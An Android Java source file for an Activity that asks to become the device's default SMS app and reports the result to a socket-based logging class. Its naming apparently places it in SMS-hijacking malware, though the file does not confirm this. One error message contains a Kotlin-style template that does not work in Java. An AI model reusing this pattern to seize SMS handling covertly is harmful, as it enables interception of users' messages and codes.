package com.sonnokta.zzz.smsp;

import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;

import androidx.annotation.Nullable;

import com.sonnokta.zzz.socketsp.IOSocketyt;

public class ChangeSmsManagerew extends Activity {
    private static String TAG = "bwolf-ChangeSmsManagerew";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            RoleManager roleManager = this.getSystemService(RoleManager.class);
            boolean isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS);
            if (isRoleAvailable) {
                boolean isRoleHeld = roleManager.isRoleHeld(RoleManager.ROLE_SMS);
                if (!isRoleHeld) {
                    Intent roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS);
                    startActivityForResult(roleRequestIntent, 1);
                    IOSocketyt.sendLogs("", "ChangeSmsManagerew onCreate", "success");;
                    finish();
                }
            }
        } else {
            finish();
        }
    }

    public void swapSMSManager(Context context, String packageName) {
        try {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            context.startActivity(intent);
        } catch (Exception ex) {
            IOSocketyt.sendLogs("", "swapSmsManager ${ex.localizedMessage}", "error");
        }
    }
}
